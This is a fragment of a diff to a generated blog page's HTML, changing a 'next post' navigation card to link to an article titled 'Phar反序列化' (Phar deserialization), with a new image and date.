+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -923,6 +1034,7 @@ $phar-&gt;stopBuffering();
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -933,13 +1045,13 @@ $phar-&gt;stopBuffering();
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/03/27/php%E5%86%85%E7%BD%AE%E7%B1%BB%E7%A7%AF%E7%B4%AF/">
+                <a href="/2021/03/28/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="php内置类积累">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="Phar反序列化">
                         
-                        <span class="card-title">php内置类积累</span>
+                        <span class="card-title">Phar反序列化</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -950,7 +1062,7 @@ $phar-&gt;stopBuffering();
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-03-28
                             </span>
                         <span class="publish-author">
                             
